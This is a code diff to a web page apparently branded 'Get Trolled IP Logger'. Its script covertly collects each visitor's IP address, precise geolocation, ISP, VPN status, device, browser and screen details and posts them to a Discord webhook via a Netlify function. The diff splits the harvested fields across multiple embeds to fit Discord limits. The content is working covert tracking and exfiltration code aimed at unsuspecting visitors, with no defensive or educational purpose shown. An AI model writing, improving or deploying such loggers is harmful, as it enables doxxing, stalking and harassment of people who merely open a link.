@@ -8,24 +8,22 @@
     html, body {
       margin: 0; padding: 0; height: 100%;
       background: black;
-      color: red;
       user-select: none;
       overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: monospace, monospace;
-      font-size: 1rem;
-      text-align: center;
-      padding: 10px;
     }
     #error-message {
-      cursor: pointer;
-      user-select: text;
-      max-width: 90vw;
-      word-break: break-word;
-      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      color: red;
+      background: black;
+      padding: 10px;
+      font-family: monospace;
       white-space: pre-wrap;
+      cursor: pointer;
+      display: none;
+      z-index: 9999;
+      max-height: 50vh;
+      overflow-y: auto;
     }
   </style>
 </head>
@@ -44,6 +42,11 @@
     val = val.toString();
     if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
     return val;
+  }
+
+  function safeName(name) {
+    if (!name) return "N/A";
+    return name.length > 256 ? name.slice(0, 253) + "..." : name;
   }
 
   function parseUserAgent(ua) {
@@ -80,6 +83,14 @@
     return { device, os, browser };
   }
 
+  function chunkArray(arr, size) {
+    const result = [];
+    for(let i = 0; i < arr.length; i += size) {
+      result.push(arr.slice(i, i + size));
+    }
+    return result;
+  }
+
   async function fetchIPInfo() {
     const res = await fetch('https://ipwhois.app/json/');
     if (!res.ok) throw new Error('Failed to fetch IP info');
@@ -94,11 +105,11 @@
     return res.json();
   }
 
-  async function sendDiscordWebhook(embed) {
+  async function sendDiscordWebhook(embeds) {
     const res = await fetch(netlifyFunctionUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] }),
+      body: JSON.stringify({ embeds }),
     });
     if (!res.ok) {
       const text = await res.text();
@@ -125,60 +136,76 @@
         weatherDescription = weather.lang_en[0].value || "N/A";
       }
 
-      const embed = {
-        title: "🕵️ New Visitor Logged",
+      // Prepare all fields
+      const allFields = [
+        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
+        { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
+        { name: "Hostname", value: safeValue(data.hostname), inline: true },
+        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
+        { name: "Region", value: safeValue(data.region), inline: true },
+        { name: "City", value: safeValue(data.city), inline: true },
+        { name: "Zip", value: safeValue(data.postal), inline: true },
+        { name: "Latitude", value: safeValue(data.latitude), inline: true },
+        { name: "Longitude", value: safeValue(data.longitude), inline: true },
+        { name: "ISP", value: safeValue(data.isp), inline: false },
+        { name: "Organization", value: safeValue(data.org), inline: false },
+        { name: "ASN", value: safeValue(data.asn), inline: true },
+        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
+        { name: "Local Time", value: safeValue(localTime), inline: true },
+        { name: "Currency", value: `${safeValue(safeGet(data, ['currency', 'code']))} (${safeValue(safeGet(data, ['currency', 'name']))})`, inline: true },
+        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
+        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
+        { name: "Mobile", value: safeValue(safeGet(data, ['security', 'is_mobile']) ? "Yes" : "No"), inline: true },
+        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
+      ];
+
+      if(weather){
+        allFields.push(
+          { name: "Weather", value: `${safeValue(weatherDescription)} - Feels like ${safeValue(weather.FeelsLikeC)}°C`, inline: true },
+          { name: "Temperature", value: `${safeValue(weather.temp_C)}°C`, inline: true },
+          { name: "Humidity", value: `${safeValue(weather.humidity)}%`, inline: true },
+          { name: "Wind Speed", value: `${safeValue(weather.windspeedKmph)} km/h`, inline: true },
+        );
+      }
+
+      allFields.push(
+        { name: "Device Model", value: safeValue(uaInfo.device), inline: true },
+        { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
+        { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
+        { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
+        { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
+      );
+
+      // Split fields into chunks of 25 (Discord max per embed)
+      const chunks = chunkArray(allFields, 25);
+
+      // Create embeds with chunked fields
+      const embeds = chunks.map((fieldsChunk, i) => ({
+        title: i === 0 ? "🕵️ New Visitor Logged" : undefined,
         color: 0x00ffff,
         timestamp: new Date().toISOString(),
-        footer: {
+        footer: i === chunks.length -1 ? {
           text: "Get Trolled IP Logger",
           icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        },
-        thumbnail: {
+        } : undefined,
+        thumbnail: i === 0 ? {
           url: safeValue(data.country_flag, 200)
-        },
-        author: {
+        } : undefined,
+        author: i === 0 ? {
           name: "Get Trolled IP Logger",
           url: "https://discord.com",
           icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        },
-        fields: [
-          { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
-          { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
-          { name: "Hostname", value: safeValue(data.hostname), inline: true },
-          { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
-          { name: "Region", value: safeValue(data.region), inline: true },
-          { name: "City", value: safeValue(data.city), inline: true },
-          { name: "Zip", value: safeValue(data.postal), inline: true },
-          { name: "Latitude", value: safeValue(data.latitude), inline: true },
-          { name: "Longitude", value: safeValue(data.longitude), inline: true },
-          { name: "ISP", value: safeValue(data.isp), inline: false },
-          { name: "Organization", value: safeValue(data.org), inline: false },
-          { name: "ASN", value: safeValue(data.asn), inline: true },
-          { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
-          { name: "Local Time", value: safeValue(localTime), inline: true },
-          { name: "Currency", value: `${safeValue(safeGet(data, ['currency', 'code']))} (${safeValue(safeGet(data, ['currency', 'name']))})`, inline: true },
-          { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
-          { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
-          { name: "Mobile", value: safeValue(safeGet(data, ['security', 'is_mobile']) ? "Yes" : "No"), inline: true },
-          { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
-          ...(weather ? [
-            { name: "Weather", value: `${safeValue(weatherDescription)} - Feels like ${safeValue(weather.FeelsLikeC)}°C`, inline: true },
-            { name: "Temperature", value: `${safeValue(weather.temp_C)}°C`, inline: true },
-            { name: "Humidity", value: `${safeValue(weather.humidity)}%`, inline: true },
-            { name: "Wind Speed", value: `${safeValue(weather.windspeedKmph)} km/h`, inline: true },
-          ] : []),
-          { name: "Device Model", value: safeValue(uaInfo.device), inline: true },
-          { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
-          { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
-          { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
-          { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
-        ]
-      };
+        } : undefined,
+        fields: fieldsChunk.map(f => ({
+          name: safeName(f.name),
+          value: safeValue(f.value),
+          inline: !!f.inline
+        }))
+      }));
 
-      await sendDiscordWebhook(embed);
+      await sendDiscordWebhook(embeds);
 
     } catch (err) {
-      const errorDiv = document.getElementById('error-message');
       errorDiv.style.display = "block";
       errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy error message.`;
       errorDiv.onclick = () => {
